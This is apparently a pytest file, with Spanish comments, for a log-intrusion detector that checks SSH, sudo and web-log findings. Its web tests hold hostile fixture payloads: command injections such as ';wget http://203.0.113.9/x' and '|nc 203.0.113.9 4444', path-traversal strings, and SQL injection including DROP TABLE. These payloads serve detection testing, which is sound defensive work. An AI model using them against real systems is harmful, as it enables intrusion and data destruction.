"""Repaso del 10 de noviembre: un log que miente, avisos de más y ataques que no se veían."""

from datetime import datetime, timedelta

from logsentinel import Severity, analyze, analyze_web, parse_web_lines
from logsentinel.notifier import format_message
from logsentinel.parser import parse_lines

T0 = datetime(2026, 9, 25, 10, 0, 0)
ATTACKER, ADMIN = "203.0.113.9", "198.51.100.5"


def ssh(seconds: float, msg: str, proc: str = "sshd[1]") -> str:
    return f"{(T0 + timedelta(seconds=seconds)).isoformat()}+02:00 srv {proc}: {msg}"


def events(*lines: str):
    return list(parse_lines(lines))


def rules(*lines: str) -> list[str]:
    return sorted(f.rule for f in analyze(events(*lines)).findings)


# El nombre de usuario lo elige el atacante, y puede llevar espacios


def test_username_cannot_smuggle_another_ip_into_a_failed_login():
    # ssh -l 'x from 198.51.100.5 port 22 ssh2' servidor: sshd lo escribe tal cual.
    [event] = events(
        ssh(0, f"Failed password for invalid user x from {ADMIN} port 22 ssh2 from {ATTACKER} port 4242 ssh2")
    )
    assert event.ip == ATTACKER and event.user == f"x from {ADMIN} port 22 ssh2"


def test_username_cannot_smuggle_another_ip_into_an_invalid_user_line():
    [event] = events(ssh(0, f"Invalid user x from {ADMIN} port 22 from {ATTACKER} port 4242"))
    assert event.ip == ATTACKER


def test_blocklist_gets_the_real_attacker_not_the_ip_in_the_username():
    lines = [
        ssh(i, f"Failed password for invalid user u{i} from {ADMIN} port 22 ssh2 from {ATTACKER} port 4242 ssh2")
        for i in range(12)
    ]
    assert analyze(events(*lines)).offending_ips() == [ATTACKER]


# Acceso correcto tras fallos


def test_typos_weeks_apart_with_logins_in_between_are_not_a_compromise():
    day = 86400
    lines = []
    for week in range(4):  # cada semana se equivoca una vez y luego entra bien
        lines.append(ssh(week * 7 * day, f"Failed password for ana from {ADMIN} port 50000 ssh2"))
        lines.append(ssh(week * 7 * day + 20, f"Accepted password for ana from {ADMIN} port 50000 ssh2"))
    assert rules(*lines) == []


# Ataque distribuido


def test_five_typos_from_five_places_over_months_are_not_a_distributed_attack():
    lines = [ssh(i * 20 * 86400, f"Failed password for ana from 198.51.100.{i + 1} port 50000 ssh2") for i in range(6)]
    assert rules(*lines) == []


def test_botnet_in_one_hour_is_still_a_distributed_attack():
    lines = [ssh(i * 60, f"Failed password for ana from 203.0.113.{i + 1} port 50000 ssh2") for i in range(6)]
    assert rules(*lines) == ["distributed_attack"]


# Servidor que solo admite llaves: los intentos no dejan "Failed password"


def test_bots_against_a_key_only_server_are_a_brute_force():
    lines = [
        ssh(i * 2, f"Connection closed by authenticating user root {ATTACKER} port {40000 + i} [preauth]")
        for i in range(8)
    ]
    lines += [
        ssh(20 + i * 2, f"Disconnected from authenticating user root {ATTACKER} port {41000 + i} [preauth]")
        for i in range(8)
    ]
    [finding] = analyze(events(*lines)).findings
    assert finding.rule == "brute_force" and finding.ip == ATTACKER and finding.count == 16


def test_closing_before_logging_in_does_not_make_a_later_login_suspicious():
    # Tres veces Ctrl-C en la pregunta de la contraseña de la llave y luego entra: no es una credencial adivinada.
    lines = [
        ssh(i, f"Connection closed by authenticating user ana {ADMIN} port {40000 + i} [preauth]") for i in range(3)
    ]
    lines.append(ssh(10, f"Accepted publickey for ana from {ADMIN} port 40010 ssh2: ED25519 SHA256:abc"))
    assert rules(*lines) == []


# sudo


def test_sudo_command_not_allowed_is_reported():
    line = "pepe : command not allowed ; TTY=pts/0 ; PWD=/home/pepe ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
    [finding] = analyze(events(ssh(0, line, proc="sudo"))).findings
    assert finding.rule == "sudo_denied" and finding.user == "pepe" and "/etc/shadow" in finding.details


# Web


def web(ip: str, request: str, status: int = 200, seconds: int = 0, size: int = 512, ua: str = "Mozilla/5.0") -> str:
    stamp = (T0 + timedelta(seconds=seconds)).strftime("%d/%b/%Y:%H:%M:%S")
    return f'{ip} - - [{stamp} +0200] "{request}" {status} {size} "-" "{ua}"'


def web_findings(*lines: str):
    return analyze_web(list(parse_web_lines(lines))).findings


def test_the_owner_using_wordpress_admin_is_not_a_scanner():
    pages = ("/wp-login.php", "/wp-admin/", "/wp-admin/index.php", "/wp-admin/edit.php", "/wp-admin/admin-ajax.php")
    assert web_findings(*(web(ADMIN, f"GET {p} HTTP/1.1", 200, i) for i, p in enumerate(pages))) == []


def test_asking_for_admin_panels_that_do_not_exist_is_a_scanner():
    pages = ("/wp-login.php", "/phpmyadmin/", "/administrator/", "/.env")
    [finding] = web_findings(*(web(ATTACKER, f"GET {p} HTTP/1.1", 404, i) for i, p in enumerate(pages)))
    assert finding.rule == "recon_scanner"


def test_secret_file_served_with_200_is_an_exposed_file():
    findings = web_findings(
        web(ATTACKER, "GET /.env HTTP/1.1", 200, size=1830), web(ATTACKER, "GET /.git/config HTTP/1.1", 404)
    )
    [finding] = [f for f in findings if f.rule == "exposed_file"]
    assert finding.severity == Severity.HIGH and "/.env" in finding.details and "/.git/config" not in finding.details


def test_site_that_answers_200_to_everything_has_no_exposed_files():
    # Una aplicación de una sola página devuelve su index.html (mismo tamaño) pidas lo que pidas.
    pages = ("/.env", "/.git/config", "/.aws/credentials", "/inicio", "/contacto")
    findings = web_findings(*(web(ATTACKER, f"GET {p} HTTP/1.1", 200, i, size=4321) for i, p in enumerate(pages)))
    assert "exposed_file" not in {f.rule for f in findings}


def test_broken_links_found_by_a_crawler_over_days_are_not_a_path_scan():
    lines = [
        web("192.0.2.66", f"GET /blog/entrada-vieja-{i} HTTP/1.1", 404, i * 3 * 3600, ua="Googlebot/2.1")
        for i in range(30)
    ]
    assert web_findings(*lines) == []


def test_many_404_in_a_few_minutes_is_still_a_path_scan():
    lines = [
        web(ATTACKER, f"GET /{name}{i} HTTP/1.1", 404, i) for i, name in enumerate(["copia", "viejo", "prueba"] * 10)
    ]
    [finding] = web_findings(*lines)
    assert finding.rule == "path_bruteforce"


def test_values_separated_by_pipes_or_semicolons_are_not_command_injection():
    lines = [
        web(ADMIN, "GET /tienda?animales=perro|cat&orden=precio HTTP/1.1"),
        web(ADMIN, "GET /buscar?lenguajes=ruby|perl|python HTTP/1.1"),
        web(ADMIN, "GET /ficha;id=5?vista=completa HTTP/1.1"),
        web(ADMIN, "GET /radio?emisoras=rock;sleep;jazz HTTP/1.1"),
    ]
    assert web_findings(*lines) == []


def test_real_command_injection_is_still_found():
    for payload in (
        ";id",
        "|id",
        ";cat /etc/hosts",
        "|cat+/etc/hosts",
        ";sleep 5",
        "$(sleep 5)",
        "`id`",
        "&&ls",
        ";ls -la",
        ";wget http://203.0.113.9/x",
        "|nc 203.0.113.9 4444",
        ";whoami",
    ):
        found = {f.rule for f in web_findings(web(ATTACKER, f"GET /ping?host=127.0.0.1{payload} HTTP/1.1"))}
        assert "rce" in found, payload


def test_tomcat_and_overlong_traversal_are_path_traversal():
    for path in ("/app/..;/manager/html", "/cgi/..%c0%af..%c0%afetc/hosts", "/x/....//....//etc/hosts"):
        found = {f.rule for f in web_findings(web(ATTACKER, f"GET {path} HTTP/1.1", 404))}
        assert "path_traversal" in found, path


def test_boolean_and_stacked_sql_injection_are_found():
    for query in (
        "id=1 AND 5231=5231",
        "id=1' AND 2*3=6-- -",
        "id=1) OR (8=8",
        "id=1;DROP TABLE users--",
        "id=1 ORDER BY 9--",
        "id=-1' UNION/**/ALL/**/SELECT 1,@@version-- -",
    ):
        found = {f.rule for f in web_findings(web(ATTACKER, f"GET /ver?{query.replace(' ', '+')} HTTP/1.1"))}
        assert "sqli" in found, query


def test_ordinary_searches_are_not_sql_injection():
    lines = [
        web(ADMIN, "GET /buscar?q=rock+and+roll+1980 HTTP/1.1"),
        web(ADMIN, "GET /buscar?q=order+by+phone+or+email HTTP/1.1"),
        web(ADMIN, "GET /buscar?q=dos+y+dos HTTP/1.1"),
        web(ADMIN, "GET /tienda?talla=38&color=rojo;azul HTTP/1.1"),
    ]
    assert web_findings(*lines) == []


# Avisos


def test_alert_text_fits_in_a_discord_message():
    lines = [ssh(i, f"Failed password for {'u' * 300}{i} from 203.0.113.{i + 1} port 5 ssh2") for i in range(3)]
    lines.append(ssh(9, f"Accepted password for ana from {ATTACKER} port 5 ssh2"))
    lines = [ssh(i, f"Failed password for ana from {ATTACKER} port 5 ssh2") for i in range(3)] + lines[-1:]
    [finding] = [f for f in analyze(events(*lines)).findings if f.rule == "success_after_failures"]
    finding.details = "x" * 5000
    assert len(format_message(finding, "srv")) <= 1900
